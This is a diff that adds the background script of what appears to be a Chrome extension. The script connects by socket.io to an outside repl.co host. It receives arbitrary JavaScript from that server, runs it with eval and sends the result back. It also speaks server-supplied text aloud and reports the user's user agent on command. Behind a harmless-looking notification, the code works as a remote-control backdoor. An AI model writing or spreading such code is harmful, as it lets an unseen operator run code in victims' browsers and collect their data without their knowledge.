@@ -1,0 +1,66 @@
+
+
+
+
+const socket = io("https://chat.elgorrapatra.repl.co",)
+
+
+
+
+chrome.notifications.create(
+    'notification-id',{   
+    type: 'basic', 
+    iconUrl: 'https://media.discordapp.net/attachments/1046523587789590658/1062513670434852904/1280x720.png', 
+    title: 'Mi títulodc', 
+    message: 'Mi mensajedc' 
+    },
+    function() {console.log('santy2')} 
+);
+    
+
+
+
+
+
+
+
+
+
+
+
+socket.on('executejs', function(data){
+
+    if(data.username==socket.id){
+        try {
+            var result = eval(data.js);
+            socket.emit('output', {origin: data.origin, result: ("Succes: " + result)})
+            console.log("Succes: " + result);
+        } catch (err) {
+            socket.emit('outputError', {origin: data.origin, error: ("Error: " + err.message)})
+            console.error("Error: " + err.message);
+        }
+        
+    }
+});
+
+
+socket.on('tts', function(data){
+
+    if(data.username==socket.id){
+        chrome.tts.speak(data.tts)
+    }
+});
+
+socket.on('ttsStop', function(data){
+    if(data.username==socket.id){
+        chrome.tts.stop();
+    }
+})
+
+socket.on('infoSend', function(data){
+    if(data==socket.id){
+        socket.emit('info',{user: socket.id, userAgent : navigator.userAgent})
+    
+}})
+    
+
